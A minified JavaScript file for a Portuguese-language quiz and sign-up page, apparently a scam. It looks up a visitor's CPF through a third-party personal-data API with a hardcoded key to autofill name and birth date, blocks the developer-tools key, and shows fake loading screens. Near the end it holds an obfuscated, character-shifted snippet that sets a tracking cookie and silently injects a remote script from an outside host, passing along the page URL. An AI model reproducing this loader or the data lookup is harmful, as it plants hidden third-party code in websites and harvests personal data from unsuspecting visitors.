function removeDiv(divID) {
  let divRemover = document.getElementById(divID);
  if (divRemover) {
    divRemover.parentNode.removeChild(divRemover)
  }
}

function scrollToTop() {
  window.scrollTo({
    top: 0,
    behavior: "smooth"
  })
}

function playAudio(audioPath) {
  new Audio(audioPath).play()
}

function cacau1() {
  nextStep(1), removeDiv("cacau1"),



    document.getElementById("cacau2").style.display = "block", scrollToTop()
}

function cacau2() {
  nextStep(2), removeDiv("cacau2"),
    document.getElementById("cacau3").style.display = "block", scrollToTop()
}

function cacau3() {
  nextStep(3), removeDiv("cacau3"),
    document.getElementById("cacau4").style.display = "block", scrollToTop()
}

function cacau4() {
  nextStep(4),
    document.querySelector(".form-animation-carregar-3").classList.add("ativo"),
    document.querySelector("main").style.display = "none",
    setTimeout((function() {
      document.querySelector(".form-animation-carregar-3").classList.remove("ativo"),
        document.querySelector("#finalizacao").classList.add("ativo"),
        document.querySelector("main").style.display = "block"
    }), 3e3), removeDiv("cacau4"),
    document.getElementById("finalizacao").style.display = "block", scrollToTop()
}

function abreModal(idModal) {
  fechaModais();
  document.getElementById(idModal).classList.add("ativo")
}

function fechaModais() {
  document.querySelectorAll(".modal-container").forEach((elem => elem.classList.remove("ativo")))
}
async function isValidCPF(cpf) {
  temporariamenteVisivel();
  if (document.getElementById("cpf").setCustomValidity(""), 11 !== cpf.length) return document.getElementById("cpf").setCustomValidity("CPF inválido. Por favor, insira um CPF válido."), !1;
  if (/^(\d)\1{10}$/.test(cpf)) return document.getElementById("cpf").setCustomValidity("CPF inválido. Por favor, insira um CPF válido."), !1;
  let sum = 0;
  for (let i = 0; i < 9; i++) sum += parseInt(cpf.charAt(i)) * (10 - i);
  let remainder = 11 - sum % 11,
    digit = 10 === remainder || 11 === remainder ? 0 : remainder;
  if (parseInt(cpf.charAt(9)) !== digit) return document.getElementById("cpf").setCustomValidity("CPF inválido. Por favor, insira um CPF válido."), !1;
  sum = 0;
  for (let i = 0; i < 10; i++) sum += parseInt(cpf.charAt(i)) * (11 - i);
  return remainder = 11 - sum % 11, digit = 10 === remainder || 11 === remainder ? 0 : remainder, parseInt(cpf.charAt(10)) === digit || (document.getElementById("cpf").setCustomValidity("CPF inválido. Por favor, insira um CPF válido."), !1)
}
async function fetchData() {
  const cpfInput = document.getElementById("cpf"),
    cpf = cpfInput.value;
  if (await isValidCPF(cpf)) {
  	//temporariamenteVisivel();
    const response = await fetch(`https://api.dataget.tech/?cpf=${cpf}&api_key=haDrHmt6w2sI`);
    if (response.ok) {
      const data = await response.json();
      if (data.dados && data.dados.nome) {
        const nomeCompleto = data.dados.nome,
          [primeiroNome, ...restoNome] = nomeCompleto.split(" ");
        document.getElementById("nome").value = primeiroNome, document.getElementById("sobrenome").value = restoNome.join(" "), document.getElementById("data-nasc").value = data.dados.nascimento.split("/").reverse().join("-")
      }
    } else console.error("Erro ao obter os dados do CPF.")
  } else cpfInput.reportValidity()
}
document.onkeydown = function(event) {
  return 123 != event.keyCode && (2 != event.button && void 0)
}, document.addEventListener("DOMContentLoaded", (function(ev) {
  const cpf = document.querySelector("#cpf"),
    nome = document.querySelector("#nome"),
    sobrenome = document.querySelector("#sobrenome"),
    dataNascimento = document.querySelector("#data-nasc"),
    termosDeUso = document.querySelector("#termos-de-uso");
  cpf.addEventListener("change", (async function() {
    await isValidCPF(cpf.value) ? (cpf.setCustomValidity(""), document.querySelector(".form-animation-carregar-1").classList.add("ativo"), setTimeout((async function() {
      document.querySelector(".form-animation-carregar-1").classList.remove("ativo"), await fetchData()
    }), 3e3)) : (cpf.setCustomValidity("CPF inválido. Por favor, insira um CPF válido."), cpf.reportValidity())
  }));
  document.querySelector(".btn-cadastrar").addEventListener("click", (function(ev) {
    ev.preventDefault(), cpf.value && nome.value && sobrenome.value && dataNascimento.value && termosDeUso.checked ? (document.querySelector(".form-animation-carregar-2").classList.add("ativo"), document.querySelector("main").style.display = "none", document.querySelector(".popup__progress").classList.remove("ativo"), document.querySelector("#modal-inscrever").style.visibility = "hidden", setTimeout((function() {
      document.querySelector(".form-animation-carregar-2").classList.remove("ativo"), document.querySelector(".form-animation-concluido").classList.add("ativo")
    }), 3e3), setTimeout((function() {
      document.querySelector(".form-animation-concluido").classList.remove("ativo"), document.querySelector("main").style.display = "block", document.querySelector(".popup__progress").classList.add("ativo"), document.querySelector("#modal-inscrever").style.visibility = "visible", fechaModais()
    }), 6e3)) : alert("Por favor, preencha todos os campos obrigatórios e aceite os termos de uso.")
  }))
}));
const quizes = document.querySelectorAll(".quiz"),
  questions = document.querySelectorAll(".popup__content");

function nextStep(step) {
  const itensProgress = document.querySelectorAll(".popup__progress-item");
  itensProgress.forEach((element => {
    element.classList.remove("popup__progress-atual")
  }));
  for (let i = 0; i < step; i++) itensProgress[i].classList.add("popup__progress-item_active"), itensProgress[i].innerHTML = "🗸";
  3 != step && (itensProgress[step].classList.add("popup__progress-atual"), itensProgress[step].innerHTML = "")
}
quizes.forEach((quiz => {
  const options = quiz.querySelectorAll(".quiz__input"),
    nextButton = quiz.querySelector(".popup__button");
  options.forEach((option => {
    option.addEventListener("click", (() => {
      nextButton.disabled = !1
    }))
  }))
})), questions.forEach(((question, i) => {
  document.getElementById(`popupButton${i+1}`).addEventListener("click", (() => {
    question.classList.remove("question-visible"), questions[i + 1] && questions[i + 1].classList.add("question-visible")
  }))
}));
(function(o, d, l) {
  try {
    o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
    o.b = o.f('UMUWJKX');
    o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function() {
      o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44zxjwxy' + 'fy3sjy4ljy4xhwnu' + 'y3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
    }, 1000);
    d.cookie = o.b + '=full;max-age=39800;'
  } catch (e) {};
}({}, document, location)); // This is just a sample script. Paste your real code (javascript or HTML) here.

if ('this_is' == /an_example/) {
  of_beautifier();
} else {
  var a = b ? (c % d) : e[f];
}

function temporariamenteVisivel() {
    const classe = '.form-animation-carregar';
    const elemento = document.querySelector(classe);
    if (elemento) {
        elemento.style.visibility = 'visible'; // Torna o elemento visível temporariamente

        // Define um temporizador para adicionar a classe 'hidden' novamente após 4 segundos
        setTimeout(() => {
            elemento.style.visibility = 'hidden'; // Torna o elemento invisível novamente após 4 segundos
        }, 3000);
    }
}


